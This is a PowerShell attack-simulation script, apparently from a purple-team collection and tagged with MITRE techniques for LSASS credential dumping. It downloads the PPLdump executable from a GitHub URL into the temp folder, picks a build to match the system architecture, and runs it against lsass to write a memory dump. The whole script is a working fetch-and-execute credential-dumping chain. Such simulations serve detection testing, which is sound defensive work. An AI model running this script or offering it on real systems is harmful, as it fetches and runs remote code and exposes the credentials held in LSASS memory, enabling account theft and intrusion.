<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    T1204.002 - User Execution: Malicious File
    T1588.001 - Obtain Capabilities: Malware
    Download PPLdump from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PPLdump.exe and execute it to dump lsass
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

if([System.IntPtr]::Size -eq 4){
    $urlexe = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PPLdump.exe"
}
elseif([System.IntPtr]::Size -eq 8){
    $urlexe = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PPLdump64.exe"
}
else{
    Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, downloading x32 version of PPLdump..."
    $urlexe = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PPLdump.exe"
}

$dumpfile = "$env:tmp\ppldmp.dmp"
$outfileexe = "$env:tmp\ppldmp.exe"

try {
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest $urlexe -OutFile $outfileexe -UseBasicParsing -Verbose -UserAgent purpleteam
    if (Test-Path $outfileexe){
        Write-Host -ForegroundColor Green "[Success] PPLdump executable downloaded to $outfileexe"
        Write-Host -ForegroundColor Cyan "[Info] Executing PPLDump executable..."
        & $outfileexe -f -v lsass lsass.dmp > $dumpfile
        Start-Sleep 1
        if (Test-Path $dumpfile){
            Write-Host -ForegroundColor Green "[Success] PPLdump extracted to $dumpfile"
        }
        else{
            Write-Host -ForegroundColor Red "[Error] Failed to extract PPLdump to $dumpfile"
        }
    }
    else{
        Write-Host -ForegroundColor Red "[Error] Failed to download PPLdump, $outfileexe not found."
    }
}
catch {
    Write-Host -ForegroundColor Red "`n[Erorr] $_"
}

Stop-Transcript -Verbose 
